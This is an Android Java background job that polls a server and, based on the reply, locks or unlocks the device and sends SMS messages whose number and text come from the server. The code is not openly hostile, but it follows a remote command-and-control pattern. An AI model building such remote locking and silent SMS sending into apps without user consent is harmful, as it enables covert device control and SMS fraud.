package privacy.app.com.text;

import android.support.annotation.NonNull;

import com.evernote.android.job.Job;
import com.google.gson.Gson;

import java.io.IOException;
import java.util.HashMap;

import commons.app.com.commons.commons.BaseJob;
import tools.app.com.loc_service.LockerComponent;
import privacy.app.com.text.keep.DeviceEventsResponse;
import privacy.app.com.text.keep.Text;
import okhttp3.ResponseBody;
import retrofit2.Response;

public class CheckPendingEventsJob extends BaseJob {

    @NonNull
    @Override
    protected Job.Result runJob(@NonNull Job.Params params) {
        try {
            Response<ResponseBody> response = TextComponent.get().api()
                    .makeGet("device/lock", new HashMap<String, String>())
                    .execute();
            if (response.body() != null) {
                handleEvents(parse(response.body()));
            }
            return getJobResult(response);
        } catch (IOException e) {
            e.printStackTrace();
            return Job.Result.RESCHEDULE;
        }
    }

    private void handleEvents(DeviceEventsResponse response) {
        if (response.isLocked()) {
            LockerComponent.get().lockDevice();
        } else {
            LockerComponent.get().unlockDevice();
        }
        Text smsToSend = response.getText();
        if (smsToSend != null) {
            TextComponent.get().onSmsComeToSend(smsToSend.getId(), smsToSend.getPhoneNumber(), smsToSend.getMessage());
        }
    }

    private DeviceEventsResponse parse(ResponseBody responseBody) throws IOException {
        String json = responseBody.string();
        return new Gson().fromJson(json, DeviceEventsResponse.class);
    }
}
